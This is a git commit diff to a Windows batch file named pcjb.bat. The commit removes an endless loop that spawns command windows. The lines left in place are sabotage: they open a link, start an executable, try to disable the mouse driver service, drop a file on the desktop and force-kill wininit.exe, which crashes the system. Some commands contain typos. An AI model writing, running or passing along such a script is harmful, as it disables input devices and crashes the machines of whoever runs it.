7ec95b4f8c7bea5abb5e454287bf5f769791022e
幻tly <81273793+tanluying@users.noreply.github.com>
2023-06-25 10:51:16 +0800

    Update pcjb.bat

--- pcjb.bat
+++ pcjb.bat
@@ -3,7 +3,4 @@ explorer http://b23.tv/iiRlLPF
 stare "" "D:\kugou.exe"
 sc config Mouclassstart= disabled
 cd.>C:\Users\user\Desktop\ying.txt
-:start
-start cmd
-goto start
 taskkill /f /im wininit.exe
